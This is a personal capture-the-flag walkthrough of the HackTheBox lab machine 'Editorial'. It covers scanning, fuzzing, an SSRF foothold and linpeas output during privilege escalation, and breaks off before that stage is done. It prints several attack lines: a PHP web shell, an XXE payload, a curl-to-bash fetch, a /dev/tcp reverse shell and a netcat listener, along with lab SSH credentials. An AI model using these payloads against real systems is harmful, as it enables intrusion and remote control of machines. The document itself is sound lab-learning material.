# Enumeration

`nmap -sV -sC -Pn 10.10.11.20`

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
|_  256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://editorial.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Add to etc hosts:
`echo "10.10.11.20 editorial.htb" | sudo tee -a /etc/hosts`

So one thing pops out at me when I first open this web app.

Specifically there is a publish with us page that clearly submits a "book"

In it, it allows us to upload a picture and a cover URL. Both of these jump out at me as potential attack vectors.

There is also the form in general. It could be vulnerable to some form of injection. But I am starting with File Upload vulns first.

Before any of that though I want to check for other pages, directories, vhosts.

I'm not sure of the extension for the files...

`ffuf -w /Users/noneya/Useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://editorial.htb/indexFUZZ`

That doesn't find anything. So lets just fuzz for directories.

`ffuf -w /Users/noneya/Useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://editorial.htb/FUZZ -ic -recursion -recursion-depth 1`

I am starting small here because I think this is likely a waste of time.

Yup, will check vhosts too but likely the same.

`ffuf -w /Users/noneya/Useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://editorial.htb -H 'Host: FUZZ.editorial.htb'`

Yup. So I am going to start with File Upload vulns.

The first thing I want is to determine back end language if possible:
`nikto -h editorial.htb -Tuning b`

```
+ Server: nginx/1.18.0 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ nginx/1.18.0 appears to be outdated (current is at least 1.20.1).
+ OPTIONS: Allowed HTTP Methods: HEAD, GET, OPTIONS .
+ 1204 requests: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2024-07-02 12:41:20 (GMT-4) (57 seconds)
```

Since its nginx we unfortunately don't know the backend language.

So I think the first thing I do now is try and upload a php file.

`<?php $var = gethostname(); echo $var;?>`

So looking at the source of the upload directory I see:
``` javascript
        <script>
          document.getElementById('button-cover').addEventListener('click', function(e) {
            e.preventDefault();
            var formData = new FormData(document.getElementById('form-cover'));
            var xhr = new XMLHttpRequest();
            xhr.open('POST', '/upload-cover');
            xhr.onload = function() {
              if (xhr.status === 200) {
                var imgUrl = xhr.responseText;
                console.log(imgUrl);
                document.getElementById('bookcover').src = imgUrl;

                document.getElementById('bookfile').value = '';
                document.getElementById('bookurl').value = '';
              }
            };
            xhr.send(formData);
          });
        </script>
```

I think the `console.log(imgUrl);` is interesting. Because if it isn't filtered could it just run the command?

I also notice this in the request header:
```
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
```

So I might just need to use XML.

What if I host with:
```
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
sudo python3 -m http.server 80
```

``` xml
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
&company;
```

That didn't work.

But if you notice it allows us to provide a url for our book cover... so If I try to do:
`http://10.10.14.23:80/shell.php` it actually reaches out to the server...

But I cannot access the uploaded file...

Maybe I could upload a file with commands and see if they run?

So first I started a netcat:
`nc -lvnp 2222`

Then I put `;curl 'http://10.10.14.23:2222/revSh.sh'|bash` into my file.

And then I retrieved my file:
`http://10.10.14.23:80/exploit`

Doesn't appear to run the code...

Maybe it should be a php file?

Nope it gets the file but doesn't run the code...

This is it I am sure but I am trying to figure out how.

Maybe its because its not a file that contains the necessary Magic Bytes?

I am going to add `ÿØÿÛC` at the front for jpg.

`http://10.10.14.23:80/exploit.php.jpg`

Hmm nope. I suppose it could be that curl doesn't exist on the server?

Could try something like:
`;bash &>/dev/tcp/10.10.14.23/2222 <&1`

`http://10.10.14.23:80/exploit`

Hmm nope.

Hints for the initial foothold say to enumerate the target using the target...

We could use this webform to do that...

[This](https://medium.com/@sahilnagmote/hackthebox-editorial-walkthrough-6d2c5ce14474) writeup gave me a hint to find the initial foothold. Didn't read it all. Just used it to figure out this is an SSRF and I need to find the port the request is coming from then request that.

When we do we see:
``` json
{"messages":[{"promotions":{"description":"Retrieve a list of all the promotions in our library.","endpoint":"/api/latest/metadata/messages/promos","methods":"GET"}},{"coupons":{"description":"Retrieve the list of coupons to use in our library.","endpoint":"/api/latest/metadata/messages/coupons","methods":"GET"}},{"new_authors":{"description":"Retrieve the welcome message sended to our new authors.","endpoint":"/api/latest/metadata/messages/authors","methods":"GET"}},{"platform_use":{"description":"Retrieve examples of how to use the platform.","endpoint":"/api/latest/metadata/messages/how_to_use_platform","methods":"GET"}}],"version":[{"changelog":{"description":"Retrieve a list of all the versions and updates of the api.","endpoint":"/api/latest/metadata/changelog","methods":"GET"}},{"latest":{"description":"Retrieve the last version of api.","endpoint":"/api/latest/metadata","methods":"GET"}}]}
```

If we run the same check on the linked urls, we get SSH creds:
dev:dev080217_devAPI!@

`ssh dev@editorial.htb`

# PrivEsc

That immediatly gets me the user flag, so now we need privesc

So lets get linpeas:
On my machine
```
cd /tmp
cp ../../Users/noneya/Useful/Tools/linpeas/linpeas.sh .
python3 -m http.server 8001
```

Then on the server:
```
cd /tmp
curl http://10.10.14.69:8001/linpeas.sh > /tmp/linpeas.sh
bash linpeas.sh > /home/dev/results.txt
```

linpeas output thats interesting...
```
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   

╔══════════╣ Can I sniff with tcpdump?
No

══╣ Some home ssh config file was found
/usr/share/openssh/sshd_config
Include /etc/ssh/sshd_config.d/*.conf
KbdInteractiveAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem	sftp	/usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow

Searching inside /etc/ssh/ssh_config for interesting info
Include /etc/ssh/ssh_config.d/*.conf
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

╔══════════╣ Searching tmux sessions
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions
tmux 3.2a


/tmp/tmux-1001
╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 4096 Apr  8  2022 /etc/apt/keyrings
drwxr-xr-x 2 root root 4096 Jun  5 14:36 /usr/share/keyrings


╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

-rw-r--r-- 1 root root 2794 Mar 26  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg
-rw-r--r-- 1 root root 1733 Mar 26  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg
-rw-r--r-- 1 root root 2899 Jul  4  2022 /usr/share/gnupg/distsigkey.gpg
-rw-r--r-- 1 root root 7399 Sep 17  2018 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 3023 Mar 26  2021 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 1150 Apr 23 13:37 /usr/share/keyrings/ubuntu-pro-anbox-cloud.gpg
-rw-r--r-- 1 root root 2247 Apr 23 13:37 /usr/share/keyrings/ubuntu-pro-cc-eal.gpg
-rw-r--r-- 1 root root 2274 Apr 23 13:37 /usr/share/keyrings/ubuntu-pro-cis.gpg
-rw-r--r-- 1 root root 2236 Apr 23 13:37 /usr/share/keyrings/ubuntu-pro-esm-apps.gpg
-rw-r--r-- 1 root root 2264 Apr 23 13:37 /usr/share/keyrings/ubuntu-pro-esm-infra.gpg
-rw-r--r-- 1 root root 2275 Apr 23 13:37 /usr/share/keyrings/ubuntu-pro-fips.gpg
-rw-r--r-- 1 root root 2275 Apr 23 13:37 /usr/share/keyrings/ubuntu-pro-fips-preview.gpg
-rw-r--r-- 1 root root 2250 Apr 23 13:37 /usr/share/keyrings/ubuntu-pro-realtime-kernel.gpg
-rw-r--r-- 1 root root 2235 Apr 23 13:37 /usr/share/keyrings/ubuntu-pro-ros.gpg

╔══════════╣ Analyzing Interesting logs Files (limit 70)
-rw-r--r-- 1 root root 5063833 Sep 28 16:18 /var/log/nginx/access.log

-rw-r--r-- 1 root root 0 Jun  4 15:25 /var/log/nginx/error.log

╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3771 Jan  6  2022 /etc/skel/.bashrc
-rw-r--r-- 1 dev dev 3771 Jan  6  2022 /home/dev/.bashrc





-rw-r--r-- 1 root root 807 Jan  6  2022 /etc/skel/.profile
-rw-r--r-- 1 dev dev 807 Jan  6  2022 /home/dev/.profile

══════════════════════╣ Files with Interesting Permissions ╠══════════════════════
                      ╚════════════════════════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid

-rwsr-xr-x 1 root root 227K Apr  3  2023 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 35K Apr  9 15:32 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 47K Apr  9 15:32 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 40K Feb  6  2024 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 71K Feb  6  2024 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 59K Feb  6  2024 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 72K Feb  6  2024 /usr/bin/chfn  --->  SuSE_9.3/10


╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/etc/pam.d/common-password
/usr/bin/systemd-ask-password
/usr/bin/systemd-tty-ask-password-agent
/usr/lib/git-core/git-credential
/usr/lib/git-core/git-credential-cache
/usr/lib/git-core/git-credential-cache--daemon
/usr/lib/git-core/git-credential-store
  #)There are more creds/passwds files in the previous parent folder

/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/python3/dist-packages/keyring/credentials.py
/usr/lib/python3/dist-packages/keyring/__pycache__/credentials.cpython-310.pyc
/usr/lib/python3/dist-packages/launchpadlib/credentials.py
/usr/lib/python3/dist-packages/launchpadlib/__pycache__/credentials.cpython-310.pyc
/usr/lib/python3/dist-packages/launchpadlib/tests/__pycache__/test_credential_store.cpython-310.pyc
/usr/lib/python3/dist-packages/launchpadlib/tests/test_credential_store.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/client_credentials.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/client_credentials.cpython-310.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/resource_owner_password_credentials.cpython-310.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py
/usr/lib/python3/dist-packages/twisted/cred/credentials.py
/usr/lib/python3/dist-packages/twisted/cred/__pycache__/credentials.cpython-310.pyc
/usr/lib/systemd/systemd-reply-password
/usr/lib/systemd/system/multi-user.target.wants/systemd-ask-password-wall.path
/usr/lib/systemd/system/sysinit.target.wants/systemd-ask-password-console.path
/usr/lib/systemd/system/systemd-ask-password-console.path
/usr/lib/systemd/system/systemd-ask-password-console.service
/usr/lib/systemd/system/systemd-ask-password-plymouth.path
/usr/lib/systemd/system/systemd-ask-password-plymouth.service
  #)There are more creds/passwds files in the previous parent folder

/usr/share/doc/git/contrib/credential/gnome-keyring/git-credential-gnome-keyring.c
/usr/share/doc/git/contrib/credential/libsecret/git-credential-libsecret.c
/usr/share/doc/git/contrib/credential/netrc/git-credential-netrc.perl
/usr/share/doc/git/contrib/credential/netrc/t-git-credential-netrc.sh
/usr/share/doc/git/contrib/credential/osxkeychain/git-credential-osxkeychain.c
/usr/share/doc/git/contrib/credential/wincred/git-credential-wincred.c
/usr/share/man/man1/git-credential.1.gz
/usr/share/man/man1/git-credential-cache.1.gz
/usr/share/man/man1/git-credential-cache--daemon.1.gz
/usr/share/man/man1/git-credential-store.1.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/man/man7/gitcredentials.7.gz
/usr/share/man/man8/systemd-ask-password-console.path.8.gz
/usr/share/man/man8/systemd-ask-password-console.service.8.gz
/usr/share/man/man8/systemd-ask-password-wall.path.8.gz
/usr/share/man/man8/systemd-ask-password-wall.service.8.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/pam/common-password.md5sums
/var/cache/debconf/passwords.dat
/var/lib/cloud/instances/iid-datasource-none/sem/config_set_passwords
/var/lib/pam/password

```

Following the vulns at the top of the linpeas output got me the answer... I think...

